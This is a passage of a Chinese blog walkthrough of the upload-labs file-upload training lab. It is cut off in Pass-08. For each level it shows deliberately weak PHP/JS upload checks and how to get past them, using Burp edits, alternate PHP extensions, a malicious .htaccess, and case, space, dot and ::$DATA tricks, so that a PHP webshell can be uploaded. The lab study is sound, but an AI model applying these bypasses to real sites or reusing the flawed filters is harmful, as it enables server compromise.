<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == null || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        var errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过js判断一下文件后缀是否为<code>.jpg</code>|<code>.png</code>|<code>.gif</code>,不是就不允许上传。</p>
<p><strong>绕过方法：</strong></p>
<p>前端js验证的绕过，我们可以将上传的php文件改后缀名为<code>jpg</code>|<code>png</code>|<code>gif</code>,绕过js验证后，再用burp更改上传请求。</p>
<img src="http://img.kawhi.xyz/image-20200502125214737.png" style="high:100%;width:100%;" />

<p>然后再点forword放行请求：</p>
<img src="http://img.kawhi.xyz/image-20200502125346077.png" style="high:30%;width:30%;" />

<p>可以看到<code>1.php</code>已经成功上传。</p>
<p>再用蚁剑连接即可：</p>
<img src="http://img.kawhi.xyz/image-20200502125541669.png" style="high:100%;width:100%;" />

<h4 id="Pass-02-验证Content-type"><a href="#Pass-02-验证Content-type" class="headerlink" title="Pass-02(验证Content-type)"></a><strong>Pass-02(验证Content-type)</strong></h4><p>看源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后端php代码只对<code>Content-Type</code>进行了检查。</p>
<p><strong>绕过方法：</strong></p>
<p>直接在burp修改<code>content-type</code>为允许的类型。</p>
<img src="http://img.kawhi.xyz/image-20200502180337105.png" style="high:100%;width:100%;" />

<h4 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a><strong>Pass-03(黑名单绕过)</strong></h4><p>首先看一下源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，服务器端做了一个黑名单过滤，过滤了 <code>asp</code>、<code>aspx</code>、<code>php</code>、<code>jsp</code>等后缀。</p>
<p><strong>绕过方法：</strong></p>
<p>可以上传后缀为：<code>.phtml</code>， <code>.phps</code> ，<code>.php5</code>， <code>.pht</code>。但是如果是这种类型，想要被当成php执行的话，需要有个前提条件，即Apache的<code>httpd.conf</code>有如下配置代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>

<p>在phpstudy里面设置一下就可以连上蚁剑了。</p>
<p>也可以构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们也可以把要上传的php文件的后缀名改为.jpg格式从而绕过。</p>
<h4 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04(.htaccess绕过)"></a><strong>Pass-04(.htaccess绕过)</strong></h4><p>查看源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到黑名单过滤了<code>php5</code>，<code>php</code>等许多的后缀，但是没有过滤<code>.htaccsess</code>文件。</p>
<p>这里可以上传<code>.htaccsess</code>文件,内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure>

<p>这样所有文件都会当成php来解析。</p>
<h4 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05(大小写绕过)"></a><strong>Pass-05(大小写绕过)</strong></h4><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到过滤了<code>.htaccsess</code>文件，但是没有过滤大小写。</p>
<p>直接上传<code>1.PHP</code>即可。</p>
<h4 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06(空格绕过)"></a><strong>Pass-06(空格绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到过滤了小写，但是没有去除文件名首尾的空格。</p>
<p>所以此处可以利用windows系统的命名规则进行绕过。</p>
<p>windows下<code>xx.jpg[空格]</code> 或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。</p>
<p>此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个<code>.php[空格]</code>文件即可。</p>
<img src="http://img.kawhi.xyz/image-20200502225824112.png" style="high:70%;width:70%;" />

<h4 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07(点绕过)"></a><strong>Pass-07(点绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到相比于第6关，加上了首尾去空，但是却少了尾部去点。利用windows文件命名规则绕过。</p>
<p><strong>绕过方法：</strong></p>
<p>直接上传<code>.php.</code>后缀即可。</p>
<h4 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08(::$DATA绕过)"></a><strong>Pass-08(::$DATA绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span 